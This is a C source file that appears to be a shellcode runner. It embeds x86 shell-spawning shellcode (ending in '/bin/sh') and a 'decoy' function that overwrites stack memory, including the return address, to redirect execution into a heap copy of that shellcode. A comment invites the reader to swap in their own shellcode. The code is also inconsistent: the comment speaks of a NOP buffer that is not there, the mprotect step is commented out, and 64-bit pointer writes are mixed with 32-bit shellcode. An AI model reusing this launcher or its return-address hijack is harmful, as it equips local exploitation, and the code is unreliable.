#include <unistd.h>
#include <signal.h>
#include <stdlib.h>
#include <malloc.h>
#include <sys/mman.h>
#include <string.h>
#include <errno.h>

long long  *hold;
char shellcode[] ="\x55\x89\xe5\x53\x83\xec\x28\xeb\x2c\x5b\x89\xd9\x89\x4d\x18\x8d"
"\x55\x20\x89\x55\x1c\x31\xc0\x89\x45\x1c\x89\x44\x24\x0c\x8d\x4d"
"\x18\x89\x4c\x24\x08\x89\x5c\x24\x04\x89\x04\x24\xb0\x3b\xcd\x80"
"\x83\xc4\x28\xc9\xc3\xe8\xcf\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73"
"\x68";​

  //Replace the above shellcode buffer of NOP operations with the hex code for you shell code.
  //NOTE: Make sure it is null terminated, but otherwise has no NULL characters embedded.

void decoy(char *cx)

{
 long long *ret;
 
 hold= (long long *)&ret;
 (*hold)=(long long)cx;
  hold++;
  (*hold)=(long long)cx;
  hold++;
  (*hold)=(long long)cx;
  hold++;
  (*hold)=(long long)cx;
 hold++;
  (*hold)=(long long)cx;
 hold++;
  (*hold)=(long long)cx;

}

void main ()
{  
  int pagesize;
  char *buf;
  
  pagesize = sysconf(_SC_PAGE_SIZE);
  posix_memalign(&buf, pagesize, strlen(shellcode)+10);
  strcpy(buf,shellcode);
  //mprotect(buf, strlen(shellcode)+10, PROT_EXEC|PROT_WRITE|PROT_READ);
  decoy(buf);  
  return;  
}



	    
	    
	    
	    
	    
	    
	    
	    
	    
	    
	    
	    
	    
	    
	    
	    
	    
	    
	    
	    
